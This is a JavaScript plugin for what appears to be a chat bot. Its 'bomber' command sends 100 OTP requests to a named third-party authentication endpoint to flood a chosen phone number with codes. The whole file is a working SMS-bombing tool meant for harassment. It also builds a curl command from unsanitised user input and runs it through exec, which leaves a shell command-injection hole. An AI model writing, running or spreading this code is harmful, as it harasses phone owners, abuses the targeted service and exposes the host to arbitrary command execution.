const axios = require('axios'); // Import axios library
const { exec } = require('child_process'); // Import exec for running cURL command

exports.run = {
    usage: ['bomber'],
    use: 'number without 0 and 92',
    category: 'bomber', // You can modify the category if needed
    async: async (m, { client, text, Func, isPrefix, command }) => {
        try {
            // Check if the command is for OTP bombing
            if (command === 'bomber') {
                if (!text) {
                    return client.reply(m.chat, 'Please provide a mobile number number without 0 and 92.', m);
                }

                const mobileNumber = text.trim();
                const otpUrl = "https://portallapp.com/api/v1/auth/generate-otp";
                const headers = `-H "Content-Type: application/json"`;
                const data = `-d "{\\"mobile_no\\": \\"${mobileNumber}\\"}"`;
                const curlCommand = `curl -X POST "${otpUrl}" ${headers} ${data}`;

                // Send confirmation message
                client.sendReact(m.chat, '🕒', m.key);
                client.reply(m.chat, `Starting OTP bombing on ${mobileNumber}. Please wait...`, m);

                // Send 100 OTP requests
                for (let i = 0; i < 100; i++) {
                    exec(curlCommand, (error, stdout, stderr) => {
                        if (error) {
                            console.error(`Error sending OTP: ${error.message}`);
                        } else {
                            console.log(`OTP sent successfully: ${stdout}`);
                        }
                    });
                }

                return client.reply(m.chat, '100 OTPs have been sent!', m);
            }
        } catch (e) {
            console.error(e); // Log the error for debugging
            return client.reply(m.chat, 'An error occurred while processing your request.', m);
        }
    },
    error: false,
    limit: true,
    verified: true,
    premium: false
};
